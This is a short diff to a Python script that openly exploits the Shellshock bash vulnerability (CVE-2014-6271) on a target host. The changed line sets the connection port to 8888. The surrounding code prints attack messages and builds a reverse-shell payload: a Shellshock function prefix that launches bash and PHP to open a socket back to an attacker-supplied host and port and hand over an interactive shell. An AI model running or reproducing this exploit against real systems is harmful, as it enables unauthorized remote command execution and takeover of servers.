@@ -10,7 +10,7 @@ import argparse
 def main(args):
 	print "Attempting to exploit CVE-2014-6271 on %s" % args.host
 	print "We will attempt to connect back to %s %s" % (args.remote, args.port)
-	conn = httplib.HTTPConnection(args.host)
+	conn = httplib.HTTPConnection(args.host,8888)
 
 	if args.shell == 'php':
 		reverse_shell="() { ignored;};/bin/bash -c 'php -r '$sock=fsockopen(%s, %s);exec('/bin/sh -i <&3 >&3 2>&3');'" %(args.remote, args.port)
